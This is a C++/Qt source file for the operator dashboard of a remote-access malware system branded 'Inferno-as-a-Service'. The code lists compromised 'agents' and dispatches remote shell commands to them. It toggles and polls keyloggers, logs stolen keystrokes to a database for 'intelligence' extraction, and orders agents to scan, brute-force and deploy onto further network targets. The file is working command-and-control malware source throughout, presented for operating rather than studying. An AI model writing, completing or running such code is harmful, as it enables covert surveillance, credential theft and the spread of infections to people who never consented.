#include "../../include/ui/MainWindow.hpp"
#include "../../include/ui/components/TelemetryPanel.hpp"
#include "../../include/ui/components/KeylogPanel.hpp"
#include "../../include/ui/components/IntelligencePanel.hpp"
#include "../../include/ui/components/DataStreamWidget.hpp"
#include "../../include/ui/components/AgentCardDialog.hpp"
#include "../../include/ui/components/CommandDialog.hpp"
#include "../../include/ui/components/PropagationPanel.hpp"
#include "../../include/ui/StyleSheets.hpp"
#include "../../include/database/Inferno_Database.hpp"
#include "../../include/services/IntelAnalysisService.hpp"
#include <QToolBar>
#include <QVBoxLayout>
#include <QHBoxLayout>
#include <QFile>
#include <QStatusBar>
#include <QMenuBar>
#include <QSplitter>
#include <QDateTime>
#include <QRegularExpression>
#include <QLabel>
#include <QPushButton>
#include <QListWidget>
#include <QHeaderView>
#include <QDebug>
#include <QThread>

namespace inferno {

MainWindow::MainWindow(Server* server, QWidget* parent)
    : QMainWindow(parent), m_server(server) {
    
    connect(m_server, &Server::agentConnected, this, &MainWindow::onAgentConnected);
    connect(m_server, &Server::agentDisconnected, this, &MainWindow::onAgentDisconnected);
    connect(m_server, &Server::shellOutputReceived, this, &MainWindow::onShellOutputReceived);
    connect(m_server, &Server::processListReceived, this, &MainWindow::onProcessListReceived);
    connect(m_server, &Server::keylogReceived, this, &MainWindow::onKeylogReceived);
    connect(m_server, &Server::propagationResultReceived, this, &MainWindow::onPropagationResult);
    connect(m_server, &Server::statusMessage, this, &MainWindow::onStatusMessage);

    // Animation Init
    m_radarAngle = 0;
    m_radarTimer = new QTimer(this);
    connect(m_radarTimer, &QTimer::timeout, this, &MainWindow::updateRadarAnimation);

    m_keylogPollTimer = new QTimer(this);
    m_keylogPollTimer->setInterval(1500);
    connect(m_keylogPollTimer, &QTimer::timeout, this, &MainWindow::pollKeylogger);

    setupUI();
    loadStyleSheet();

    // Connect Panel Widget Actions
    connect(m_telemetryPanel, &TelemetryPanel::shellRequested, this, &MainWindow::executeShellCommand);
    connect(m_telemetryPanel, &TelemetryPanel::processesRequested, this, &MainWindow::requestProcessList);
    connect(m_telemetryPanel, &TelemetryPanel::statusMessage, this, &MainWindow::onStatusMessage);
    
    connect(m_keylogPanel, &KeylogPanel::keylogToggled, this, &MainWindow::toggleKeylogState);
    connect(m_keylogPanel, &KeylogPanel::statusMessage, this, &MainWindow::onStatusMessage);
    
    connect(m_intelligencePanel, &IntelligencePanel::forceScanRequested, this, &MainWindow::handleForceScan);
    connect(m_intelligencePanel, &IntelligencePanel::statusMessage, this, &MainWindow::onStatusMessage);

    connect(m_propagationPanel, &PropagationPanel::scanRequested, this, [this](const QString& target) {
        QString ip = getSelectedAgentIp();
        if (ip.isEmpty()) {
            m_propagationPanel->appendResult("SYSTEM", "No agent selected — select an agent first");
            return;
        }
        m_server->sendPropagationCommand(ip, 0, target);
        m_propagationPanel->appendResult(ip, "SCAN requested on " + target);
    });
    connect(m_propagationPanel, &PropagationPanel::bruteRequested, this, [this](const QString& target) {
        QString ip = getSelectedAgentIp();
        if (ip.isEmpty()) {
            m_propagationPanel->appendResult("SYSTEM", "No agent selected — select an agent first");
            return;
        }
        m_server->sendPropagationCommand(ip, 1, target);
        m_propagationPanel->appendResult(ip, "BRUTE requested on " + target);
    });
    connect(m_propagationPanel, &PropagationPanel::deployRequested, this, [this](const QString& target) {
        QString ip = getSelectedAgentIp();
        if (ip.isEmpty()) {
            m_propagationPanel->appendResult("SYSTEM", "No agent selected — select an agent first");
            return;
        }
        m_server->sendPropagationCommand(ip, 2, target);
        m_propagationPanel->appendResult(ip, "DEPLOY requested on " + target);
    });
    connect(m_propagationPanel, &PropagationPanel::statusMessage, this, &MainWindow::onStatusMessage);

    // Connect Business Logic Service for real-time notification updates
    connect(&IntelAnalysisService::instance(), &IntelAnalysisService::intelligenceUpdated, this, &MainWindow::handleIntelligenceUpdated);
}

void MainWindow::setupUI() {
    setWindowTitle("Inferno-as-a-Service | Operator Dashboard");
    setMinimumSize(1200, 800);

    m_agentList = new QListWidget();
    m_statusLabel = new QLabel(" SYSTEM READY");

    // Central Widget and Main Layout
    auto* centralWidget = new QWidget(this);
    setCentralWidget(centralWidget);
    auto* mainLayout = new QVBoxLayout(centralWidget);
    mainLayout->setContentsMargins(0, 0, 0, 0);
    mainLayout->setSpacing(0);

    // 1. Header Toolbar
    auto* toolbar = addToolBar("Main Controls");
    toolbar->setMovable(false);
    
    auto* titleLabel = new QLabel(" INFERNO-AS-A-SERVICE ");
    titleLabel->setStyleSheet("font-size: 18px; font-weight: bold; color: #00ff41;");
    toolbar->addWidget(titleLabel);

    // Add Spacer to push branding to the right
    auto* spacer = new QWidget();
    spacer->setSizePolicy(QSizePolicy::Expanding, QSizePolicy::Preferred);
    toolbar->addWidget(spacer);

    // Add Branding Skull (Increased Size)
    auto* brandingLabel = new QLabel();
    QPixmap skull(":/branding_skull.png");
    brandingLabel->setPixmap(skull.scaled(80, 80, Qt::KeepAspectRatio, Qt::SmoothTransformation));
    brandingLabel->setContentsMargins(0, 5, 20, 5);
    toolbar->addWidget(brandingLabel);

    // 2. Main Layout Splitter (Sidebar vs Tabs)
    auto* mainSplitter = new QSplitter(Qt::Horizontal, centralWidget);
    
    // Sidebar Container
    auto* agentContainer = new QWidget();
    auto* agentLayout = new QVBoxLayout(agentContainer);
    auto* agentHeader = new QHBoxLayout();
    agentHeader->addWidget(new QLabel("CONNECTED AGENTS"));
    agentHeader->addStretch();
    m_btnScan = new QPushButton();
    m_btnScan->setObjectName("iconButton");
    m_btnScan->setCheckable(true);
    m_btnScan->setFixedSize(40, 40);
    m_btnScan->setIcon(QIcon(":/icon_scan.png"));
    m_btnScan->setIconSize(QSize(32, 32));
    m_btnScan->setToolTip("Scan Network");
    connect(m_btnScan, &QPushButton::clicked, this, &MainWindow::toggleScan);
    agentHeader->addWidget(m_btnScan);
    agentLayout->addLayout(agentHeader);
    
    m_agentList->setIconSize(QSize(36, 36));
    m_agentList->setStyleSheet(ui::style::AGENT_LIST);
    m_agentList->setHorizontalScrollBarPolicy(Qt::ScrollBarAlwaysOff);
    m_agentList->setContextMenuPolicy(Qt::CustomContextMenu);
    connect(m_agentList, &QListWidget::customContextMenuRequested, this, &MainWindow::showAgentContextMenu);
    
    connect(m_agentList, &QListWidget::itemDoubleClicked, this, [this](QListWidgetItem* item){
        QString agentIp = item->data(Qt::UserRole).toString();
        QString uuid = m_agentIpToUuid.value(agentIp);
        
        AgentProfile profile = Inferno_Database::instance().getAgentProfile(uuid);
        AgentCardDialog dlg(profile, this);
        dlg.exec();
    });
    
    connect(m_agentList, &QListWidget::itemSelectionChanged, this, &MainWindow::handleAgentSelectionChanged);
    agentLayout->addWidget(m_agentList);
    mainSplitter->addWidget(agentContainer);

    // Right Pane Tab Widget
    m_tabWidget = new QTabWidget(centralWidget);
    m_tabWidget->setStyleSheet(ui::style::TAB_WIDGET);

    // Tab 1: Control Center Panels
    m_telemetryPanel = new TelemetryPanel(this);
    m_keylogPanel = new KeylogPanel(this);

    auto* controlWidget = new QWidget();
    auto* controlLayout = new QVBoxLayout(controlWidget);
    controlLayout->setContentsMargins(0, 0, 0, 0);

    auto* controlSplitter = new QSplitter(Qt::Horizontal, controlWidget);
    controlSplitter->addWidget(m_telemetryPanel);
    controlSplitter->addWidget(m_keylogPanel);
    controlSplitter->setStretchFactor(0, 3);
    controlSplitter->setStretchFactor(1, 2);
    
    controlLayout->addWidget(controlSplitter);
    m_tabWidget->addTab(controlWidget, "Surveillance & Controls");

    // Tab 2: Intelligence Analysis Panel
    m_intelligencePanel = new IntelligencePanel(this);
    m_tabWidget->addTab(m_intelligencePanel, "Intelligence Analysis");

    // Tab 3: Network Propagation Panel
    m_propagationPanel = new PropagationPanel(this);
    m_tabWidget->addTab(m_propagationPanel, "Network Propagation");

    mainSplitter->addWidget(m_tabWidget);
    mainSplitter->setStretchFactor(0, 1);
    mainSplitter->setStretchFactor(1, 4);

    mainLayout->addWidget(mainSplitter);

    // Footer Data Stream Aesthtetic
    auto* dataStream = new DataStreamWidget(this);
    mainLayout->addWidget(dataStream);

    // Status Bar
    statusBar()->addWidget(m_statusLabel);
}

void MainWindow::loadStyleSheet() {
    QFile file(":/styles.qss");
    if (file.open(QFile::ReadOnly)) {
        QString styleSheet = QLatin1String(file.readAll());
        setStyleSheet(styleSheet);
    }
}

void MainWindow::onAgentConnected(const QString& ip, const QString& info) {
    qDebug() << "[MainWindow] Agent connected from" << ip << "with info:" << info;
    
    static const QRegularExpression uuidRegex("ID: ([^| ]+)");
    auto match = uuidRegex.match(info);
    QString uuid = match.hasMatch() ? match.captured(1) : "UNKNOWN_UUID";
    m_agentIpToUuid[ip] = uuid;
    
    Inferno_Database::instance().setAgentOnlineStatus(uuid, true);

    QString hostname = "Unknown", osInfo = "Unknown";
    auto parts = info.split('|');
    for (const QString& part : parts) {
        if (part.contains("Host:")) hostname = part.section(':', 1).trimmed();
        if (part.contains("OS:")) osInfo = part.section(':', 1).trimmed();
    }
    Inferno_Database::instance().registerAgent(uuid, ip, hostname, osInfo);

    QString displayInfo = QString("%1 (%2)").arg(ip, hostname);
    
    QListWidgetItem* item = nullptr;
    for (int i = 0; i < m_agentList->count(); ++i) {
        if (m_agentList->item(i)->data(Qt::UserRole + 1).toString() == uuid) {
            item = m_agentList->item(i);
            break;
        }
    }

    if (!item) {
        item = new QListWidgetItem("🟢 " + displayInfo, m_agentList);
        item->setData(Qt::UserRole, ip);
        item->setData(Qt::UserRole + 1, uuid);
    } else {
        item->setText("🟢 " + displayInfo);
        item->setData(Qt::UserRole, ip); // Update volatile IP for command routing
    }
    
    QString lowerInfo = info.toLower();
    if (lowerInfo.contains("windows")) {
        item->setIcon(QIcon(":/os_win.png"));
    } else if (lowerInfo.contains("linux")) {
        item->setIcon(QIcon(":/os_linux.png"));
    } else if (lowerInfo.contains("macos") || lowerInfo.contains("darwin") || lowerInfo.contains("apple")) {
        item->setIcon(QIcon(":/os_mac.png"));
    }
    
    m_telemetryPanel->appendText(QString("[SYSTEM] New connection established from %1").arg(ip));
    m_statusLabel->setText(QString(" Agent %1 connected").arg(ip));
}

void MainWindow::onAgentDisconnected(const QString& ip) {
    QString uuid = m_agentIpToUuid.value(ip);
    Inferno_Database::instance().setAgentOnlineStatus(uuid, false);

    for (int i = 0; i < m_agentList->count(); ++i) {
        if (m_agentList->item(i)->data(Qt::UserRole).toString() == ip) {
            QString currentText = m_agentList->item(i)->text();
            if (currentText.startsWith("🟢")) {
                m_agentList->item(i)->setText("🔴" + currentText.mid(2));
            }
            break;
        }
    }
    m_telemetryPanel->appendText(QString("[SYSTEM] Agent %1 has disconnected").arg(ip));
    m_statusLabel->setText(QString(" Agent %1 offline").arg(ip));
}

void MainWindow::onShellOutputReceived(const QString& ip, const QString& output) {
    QString timestamp = QDateTime::currentDateTime().toString("HH:mm:ss");
    static const QRegularExpression lineSplitter(QStringLiteral("[\r\n]+"));
    QStringList lines = output.split(lineSplitter, Qt::SkipEmptyParts);
    
    QString uuid = m_agentIpToUuid.value(ip);
    if (uuid.isEmpty()) {
        auto items = m_agentList->findItems(ip, Qt::MatchStartsWith);
        if (!items.isEmpty()) uuid = items.first()->data(Qt::UserRole + 1).toString();
    }

    for (const QString& line : lines) {
        QString trimmed = line.trimmed();
        if (trimmed.isEmpty()) continue;
        
        Inferno_Database::instance().logTelemetry(uuid, "SHELL", trimmed);

        QString formatted = QString("[%1] [%2] %3").arg(timestamp, ip, trimmed);
        m_telemetryPanel->appendText(formatted);

        // Process telemetry classification
        IntelAnalysisService::instance().processTelemetry(uuid, trimmed, "Shell Output: " + trimmed);
    }
}

void MainWindow::onProcessListReceived(const QString& ip, const QString& output) {
    QString uuid = m_agentIpToUuid.value(ip);
    if (uuid.isEmpty()) {
        auto items = m_agentList->findItems(ip, Qt::MatchStartsWith);
        if (!items.isEmpty()) uuid = items.first()->data(Qt::UserRole + 1).toString();
    }
    
    Inferno_Database::instance().logTelemetry(uuid, "PROC", output);

    QString timestamp = QDateTime::currentDateTime().toString("HH:mm:ss");
    QString formatted = QString("[%1] [%2] [PROCESS SNAPSHOT RECEIVED]").arg(timestamp, ip);
    m_telemetryPanel->appendText(formatted);
    m_telemetryPanel->appendText(output);
}

void MainWindow::onKeylogReceived(const QString& ip, const QString& data) {
    if (data.trimmed().isEmpty()) return;
    
    QString uuid = m_agentIpToUuid.value(ip);
    if (uuid.isEmpty()) {
        auto items = m_agentList->findItems(ip, Qt::MatchStartsWith);
        if (!items.isEmpty()) uuid = items.first()->data(Qt::UserRole + 1).toString();
    }

    Inferno_Database::instance().logKeylog(uuid, data);

    QString timestamp = QDateTime::currentDateTime().toString("HH:mm:ss");
    QString line = QString("[%1] [%2] %3").arg(timestamp, ip, data);
    m_keylogPanel->appendText(line);

    // Delegate real-time buffer updating and extraction to the service layer
    IntelAnalysisService::instance().processKeylog(uuid, data);
}

void MainWindow::onPropagationResult(const QString& ip, const QString& result) {
    m_propagationPanel->appendResult(ip, result);
}

QString MainWindow::getSelectedAgentIp() const {
    QListWidgetItem* item = m_agentList->currentItem();
    if (!item) return {};
    return item->data(Qt::UserRole).toString();
}

void MainWindow::onStatusMessage(const QString& message) {
    m_telemetryPanel->appendText(QString("[SERVER] %1").arg(message));
    m_statusLabel->setText(" " + message);
}

void MainWindow::toggleScan() {
    if (m_radarTimer->isActive()) {
        m_radarTimer->stop();
        QPixmap pixmap(":/icon_scan.png");
        m_btnScan->setIcon(QIcon(pixmap));
        m_btnScan->setChecked(false);
    } else {
        m_radarTimer->start(50);
        m_btnScan->setChecked(true);
    }
}

void MainWindow::updateRadarAnimation() {
    m_radarAngle = (m_radarAngle + 10) % 360;
    QPixmap pixmap(":/icon_scan.png");
    QTransform tr;
    tr.rotate(m_radarAngle);
    m_btnScan->setIcon(QIcon(pixmap.transformed(tr, Qt::SmoothTransformation)));
}

void MainWindow::toggleKeylogState(bool active) {
    QListWidgetItem* item = m_agentList->currentItem();
    if (!item) return;
    
    QString agentIp = item->data(Qt::UserRole).toString();
    if (active) {
        m_server->toggleKeylogger(agentIp, true);
        m_activeKeylogIps.insert(agentIp);
        if (!m_keylogPollTimer->isActive()) {
            m_keylogPollTimer->start(1500);
        }
    } else {
        m_server->toggleKeylogger(agentIp, false);
        m_activeKeylogIps.remove(agentIp);
        if (m_activeKeylogIps.isEmpty()) {
            m_keylogPollTimer->stop();
        }
    }
}

void MainWindow::pollKeylogger() {
    if (m_activeKeylogIps.isEmpty()) {
        m_keylogPollTimer->stop();
        return;
    }
    
    for (const QString& agentIp : m_activeKeylogIps) {
        m_server->requestKeylogDump(agentIp);
    }
}

void MainWindow::showAgentContextMenu(const QPoint& pos) {
    QListWidgetItem* item = m_agentList->itemAt(pos);
    if (!item) return;

    m_agentList->setCurrentItem(item);

    QMenu menu(this);
    menu.addAction("Execute Shell...", this, &MainWindow::executeShellCommand);
    menu.addAction("Refresh Processes", this, &MainWindow::requestProcessList);
    menu.addSeparator();
    
    QAction* disconnectAction = menu.addAction("Disconnect Agent");
    connect(disconnectAction, &QAction::triggered, this, [this, item]() {
        QString agentIp = item->data(Qt::UserRole).toString();
        m_server->disconnectAgent(agentIp);
    });
    
    menu.exec(m_agentList->mapToGlobal(pos));
}

void MainWindow::executeShellCommand() {
    QListWidgetItem* item = m_agentList->currentItem();
    if (!item) {
        onStatusMessage("No agent selected for command");
        return;
    }

    QString agentIp = item->data(Qt::UserRole).toString();
    
    CommandDialog dlg(agentIp, this);
    if (dlg.exec() == QDialog::Accepted) {
        QString cmd = dlg.getCommand();
        if (!cmd.isEmpty()) {
            m_telemetryPanel->appendText(QString("[LOCAL] Dispatching: %1").arg(cmd));
            m_server->sendShellCommand(agentIp, cmd);
        }
    }
}

void MainWindow::requestProcessList() {
    QListWidgetItem* item = m_agentList->currentItem();
    if (!item) return;
    
    QString agentIp = item->data(Qt::UserRole).toString();
    m_telemetryPanel->appendText(QString("[LOCAL] Requesting Process List from %1").arg(agentIp));
    m_server->requestProcessList(agentIp);
}

void MainWindow::handleForceScan(const QString& uuid) {
    onStatusMessage("Scanning historical logs for agent in background...");
    
    QThread* thread = QThread::create([this, uuid]() {
        int new_findings = IntelAnalysisService::instance().runHistoricalScan(uuid);
        
        QMetaObject::invokeMethod(this, [this, new_findings]() {
            onStatusMessage(QString("Scan complete. Identified %1 new findings.").arg(new_findings));
        }, Qt::QueuedConnection);
    });

    connect(thread, &QThread::finished, thread, &QThread::deleteLater);
    thread->start();
}

void MainWindow::handleAgentSelectionChanged() {
    auto* current = m_agentList->currentItem();
    if (!current) return;

    QString ip = current->data(Qt::UserRole).toString();
    QString uuid = m_agentIpToUuid.value(ip);
    if (uuid.isEmpty()) return;

    m_telemetryPanel->loadHistory(uuid);
    m_keylogPanel->loadHistory(uuid);
    m_intelligencePanel->loadIntelligenceList(uuid);
    
    // Update keylogger eye button state for the selected agent
    m_keylogPanel->setKeylogButtonChecked(m_activeKeylogIps.contains(ip));
}

void MainWindow::handleIntelligenceUpdated(const QString& uuid) {
    auto* current = m_agentList->currentItem();
    if (current) {
        QString ip = current->data(Qt::UserRole).toString();
        if (m_agentIpToUuid.value(ip) == uuid) {
            m_intelligencePanel->loadIntelligenceList(uuid);
        }
    }
}

} // namespace inferno
